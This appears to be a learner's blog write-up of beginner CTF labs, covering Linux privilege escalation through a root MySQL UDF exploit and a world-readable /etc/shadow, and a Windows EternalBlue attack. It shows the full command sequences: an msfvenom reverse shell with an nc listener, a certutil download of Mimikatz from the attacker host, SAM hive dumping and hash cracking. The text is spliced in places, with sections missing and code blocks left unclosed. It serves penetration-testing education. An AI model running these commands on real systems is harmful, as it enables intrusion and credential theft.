                <h2>Service Exploits - MySQL</h2>
                <p>The first challenge informs us that there is an incorrectly configured MySQL service running as root. It also tells us there is no password! Let us start a command-line client session and connect to the MySQL server as the user root.</p>
                <pre><code>user@debian:~$ mysql -u root</code></pre>
                <p>Sure enough the connection was successful. No password required!</p>
                <pre><code>mysql> SELECT USER();
+--------------------+
| USER()             |
+--------------------+
| root@localhost     |
+--------------------+</code></pre>
                <p>Next, let us see what privileges are assigned to our currently logged-in MySQL user, in our case root. Understanding these permissions will help us identify our potential next steps and what avenues are open to us for further exploiting the machine.</p>
                <pre><code>mysql> SHOW GRANTS FOR CURRENT_USER;</code></pre>
                <p>Gives the output: </p>
                <pre><code>+---------------------------------------------------------------------+
| Grants for root@localhost                                           |
+---------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION |
+---------------------------------------------------------------------+</code></pre>
                <p>Excellent. Our user, root, has "ALL PRIVILEGES" set, meaning we have complete access to all databases and tables on the MySQL server. This challenge has practically handed us the exploit to use and even placed the necessary code on the target server. However, let's perform the steps manually for learning purposes. The exploit in question can be found <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518).</p>
                <p>The exploit code <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518) leverages a vulnerability in MySQL's User Defined Functions (UDFs) to achieve local privilege escalation. UDFs extend MySQL functionality by allowing users to create custom functions written in C, loaded as shared libraries. In this exploit, the code defines a UDF, <strong>do_system()</strong>, which executes shell commands using the C standard library function <strong>system()</strong>. We can invoke our UDF through MySQL and instruct it to spawn a shell. Since MySQL is running as the root user, any system command exectued through <strong>do_system()</strong> will also run with root privileges. This means we can achieve a root shell, gaining full control over the target system</p>
                <p>Navigate to the "/tmp" directory and create a file to hold the UDF exploit code.</p>
                <pre><code>user@debian:/tmp$ nano exploit_udf.c</code></pre>
                <p>Paste the exploit code into the file, ensure it is copied exactly, as any syntax errors will casue issues during compilation. Once you have saved the file, compile it using <strong>gcc</strong> to produce a shared object (.so) file:</p>
                <pre><code>user@debian:/tmp$ gcc -Wall -fPIC -shared -o exploit_udf.so exploit_udf.c -lc</code></pre>
                <p>Connect to the MySQL server and switch to the <strong>MySQL</strong> system database:</p>
                <pre><code>mysql> use mysql
Reading table information for completion of table and columns names
You can turn off this feature to get a quicker startup with -A
                
Database changed
mysql> </code></pre>
                <p>Create a new table "foo" with a single column, let's a call it "line", of type "BLOB":</p>
                <pre><code>mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)</code></pre>
                <p>Load the shared object file we created eariler in to the table, "foo":</p>
                <pre><code>mysql> insert into foo values(load_file('/tmp/exploit_udf.so'));
Query OK, 1 row affected (0.00 sec)</code></pre>
                <p>Dump the contents of the "foo" table into a file, effectively placing the UDF shared object file in a directory where MySQL expects to find plugin libraries:</p>
                <pre><code>mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/exploit.so';
Query OK, 1 row affected (0.00 sec)</code></pre>
                <p>Create a custom MySQL function called "do_system" that will be available for use in SQL queries. The "soname" directive tells MySQL to load the function from the shared library "exploit_udf.so":</p>
                <pre><code>mysql> create function do_system returns integer soname 'exploit_udf.so';
Query OK, 0 rows affected (0.00 sec)</code></pre>
                <p>Use the custom function to copy the "/bin/bash" binary to "/tmp/rootbash", and set the SUID bit so we can run it as root, the creator of the file, also make it executable:</p>
                <pre><code>mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+---------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')    |
+---------------------------------------------------------------------+
|                                                                   0 |
+---------------------------------------------------------------------+
1 row in set (0.00 sec)</code></pre>
                <p>Exit the MySQL client and run the root shell ("-p" is important here as it tells BASH not to reset the environment variables to default, which would typically strip out any special environment variables or manipulations that may have been set during the eariler steps of our attack).</p>
                <pre><code>user@debian:/tmp$ /tmp/rootbash -p
rootbash-4.1# whoami
root</code></pre>
                <p><strong>Congratulations, you own the system!</strong></p>
            </section>
            <section id="Two">
                <h2>Readable /etc/shadow</h2>
                <p>The "/etc/shadow" file that contains user password hashes should only be readable by root. Let us see if that is the case:</p>
                <pre><code>user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
                <p>Nope! It is readable by absolutely everyone! Let us have a look inside:</p>
                <pre><code>user@debian:~$ nano /etc/shadow
root:$6$Tb/euwmL$*********************************************</code></pre>
                <p>We have the password hash for root (I have masked it here, so you can go and look for yourself). This is likely a <strong>SHA512crypt</strong> hash, as this is the hashing algorithm commonly used in Unix-like operating systems to store password hashes in the system's "/etc/shadow" file. Let's use John the Ripper (JTR) to see if we can crack it.</p>
                <pre><code>user@local:~/path/to/john$ ./john -format=sha512crypt -wordlist=/I/am/using/rockyou.txt /path/to/saved/hash</code></pre>
                <p>Sure enough this gives us the root password. Switch back to the target machine and switch to root, using the password.</p>
                <pre><code>user@debian:~$ su root
Password:
root@debian/home/user# whoami
root</code></pre>
                
                
                <p>I can also see that the "shell_prep.sh" script would have given us options to generate a reverse shell, either a Meterpreter shell or a regular cmd shell, for which it would also generate a raw binary file. Finally, it would have combined this reverse shell binary with the kernel shell code binary. So far, as we are doing this manually, we have only created the shellcode binary, "sc_x64_kernel.bin". We need to create a raw binary of a reverse shell for this exploit to work. Of course I cannot read the binary and I have not read the assembly, but I imagine the kernel shell code takes control of the target system's kernel, perhaps to gain elevated privileges and preparing the system for executing further commands, and will then execute the reverse shell, which we can catch on our local machine. </p>
                <p>Let us create our reverse shell code binary using <i>msfvenom</i>. Here we create a stageless Windows, 64-bit, reverse-tcp shell, in raw binary format.</p>
                <pre><code>case@local:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LOCAL_IP} LPORT=444 -a x64 -f raw -o sc_x64_msf.bin</code></pre>
                <p>Finally, we need to combine the kernel shellcode exploit binary with the reverse shell binary, again this would have been done by the "shell_prep.sh", but manually is easy too.</p>
                <pre><code>case@local:~$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin</code></pre>
                <p>We now need to run the exploit. The AutoBlue repo also contains an exploit script "eternalblue_exploit7.py". This script is fairly complex, and even with five years of Web Development experience I find it diffcult to understand exactly what is going on here. As far as I can make out, the script loads the binary shellcode file we created earlier (sc_x64.bin), which is the payload, and places it into memory. The shellcode/payload will then execute, providing us with our reverse shell. First then, let us set up a listener on our local/attacking machine.</p>
                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
                <p>We can then run the exploit.</p>
                <pre><code>case@local:~$ python3 eternalblue_exploit7.py 10.10.34.160 sc_x64.bin</code></pre>
                <p>We are in!</p>

                <h2>Step Three - Escalation and Password Dumping</h2>
                <p>Firstly, let us see which user context our reverse shell is running under.</p>
                <pre><code>C:\Windows\system32>cmd.exe /c whoami
cmd.exe /c whoami
nt authority\system</code></pre>
                <p>We have gained <i>NT AUTHORITY\SYSTEM</i> privileges. This is the highest level of privilege on Windows, similar to "root" on Linux. Therefore, we now have full administrative control on the target machine and should be able to perform any action on the system, including altering files, changing settings and installing programs. Given this information we can now upload Mimikatz, which will allow us to extract additional sensitive information, such as password hashes and kerberos tickets (Mimikatz is a post-exploitation tool designed to allow attackers to extract sensitive data, like passwords). Let us upload Mimikatz to our target, with a view to dumping the NTLM hashes (part of this CTF is cracking a specific password, so we will need this information). </p>
                <p>You can download Mimikatz binaries from the GitHub <a href="https://github.com/gentilkiwi/mimikatz/releases"> releases repo.</a> This might be blocked by your browser as a dangerous file. In which case, simply Request it:</p>
                <pre><code>wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip</code></pre>
                <p> Next, start a Python HTTP server. I have a Python virtual environment setup, so the command looks like this.</p>
                <pre><code>(kcah_py_env) case@local:~$ python3 -m http.server 8001</code></pre>
                <p>Then request "mimikatz.exe" from the target server (make sure the mimikatz executable is located in the same directory as you are running the Python server from).</p>
                <pre><code>C:\Windows\system32>certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
****  Online  ****
  000000  ...
  108c00
CertUtil: -URLCache command completed successfully.</code></pre>
                <p>We have successfully uploaded the Mimikatz executable to our target server. We now want to extract the password hashes. We need to accesss the Security Account Manager (SAM) hive, which is the file that contains the hashed passwords of all the local user accounts. However, we have a problem, as the file will likely already be in use by another system process, and will be locked by Windows. Attempting to read the the file directly with Mimikatz will likely fail. The first step, therefore, will be to export the relevant hives/files from the Windows Registry into separate files that we can readily access with Mimikatz. </p>
            <pre><code>C:\Windows\System32>reg save hklm\sam c:\sam</code></pre>
            <pre><code>C:\Windows\System32>reg save hklm\system c:\system</code></pre>
            <p>Here is our output. It appears we have a problem!</p>
            <pre><code>C:\Windows\system32>reg save hklm\sam c:\sam
reg save hklm\sam c:\sam
ERROR: A required privilege is not held by the client.</code></pre>
            <p>Fortunately for us we have uploaded the excellent post exploitation tool Mimikatz. Mimikatz has the following command <i>privilege::debug</i>. When you run this command Mimikatz attempts to grant the process <i>SeDebugPrivilege</i>, which is a Windows privilege that allows a user to debug processes owned by other users. Importantly, it includes the ability to read and write to the memory of other processes, including retrieving sensitive information such as passwords and hashes, from processes like "lsass.exe" (the Local Security Authority Subsystem), which manages user logins and authentication. </p>
            <p>Start Mimikatz.</p>
            <pre><code>C:\Windows\system32>mimikatz.exe</code></pre>
            <p>Run the following command, in order to grant process <i>SeDebugPrivilege</i>. You should see the OK message if this is successful. Note, I had an issue here, and I fell down a rabbit hole for several hours. The issue in the end was that I had originally uploaded the 32-bit version of Mimikatz, when the target system we are actualy trying to exploit is a 64-bit system.</p>
            <pre><code>mimikatz # privilege::debug
Privilege '20' OK</code></pre>
            <p>We can now try and export the SAM and SYSTEM hives again.</p>
            <pre><code>C:\Windows\System32>reg save hklm\sam c:\sam</code></pre>
            <pre><code>C:\Windows\System32>reg save hklm\system c:\system</code></pre>
            <p>This time we can see that we were successful.</p>
            <pre><code>C:\Windows\system32>reg save hklm\sam c:\sam
reg save hklm\sam c:\sam
The operation completed successfully.
            
C:\Windows\System32>reg save hklm\system c:\system
reg save hklm\system c:\system
The operation completed successfully</code></pre>
            <p>Here we export the SYSTEM hive too, which typically contains configuration settings and parameters that Windows uses during the boot process and for the management of hardware devices.</p>
            <p>Once we have extracted the hives we can use Mimikatz to dump the password hashes.</p>
            <pre><code>mimikatz # lsadump::sam /system:C:\system /sam:C:\sam

            <p>Make sure you save these hashes somewhere, as we will need them for the next stage of the CTF.</p>

            <section id="Four">
                <h2>Step Four - Hash Cracking</h2>
                <p>The challenge requires us to crack the password of the "non-default" user. We can see from our previous, Mimikatz, output that the non-default user is "Jon". Let us crack the hash. We could use the Python script "hash-id.py" to establish the hash format, but given that this is a beginner CTF and that we have retrieved these hashes from a Windows Security Accounts Manager (SAM) hive, it is likely that these are NT hashes. Let us use John the Ripper with format specific cracking, in order to see if our assumptions are correct.</p>
                <p>Firstly save the hash for user Jon to a text file. Then pass the hash to JTR.</p>
                <pre><code>case@local:~/src/john/run$ ./john --format=NT --fork=8 --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt</code></pre>
                <p>We now have user "Jon's" password.</p>
                <pre><code>Using default input encoding: UTF-8

                <h2>Conclusion</h2>
                <p>This was my second CTF challenge and I found it a lot more challenging than than the first one I did. However, this was primarily because I did not follow any of the pre-existing write-ups, importantly, I did not utilise Metasploit, which would have made this challenge a darn sight easier. My reason for approaching the challenge in this way is that I want to learn as much as possible. By coming up with my own ideas and approaches and testing them out, I fail more frequently. This is good, as it forces me to read more and understand how things work on a deeper level.</p>
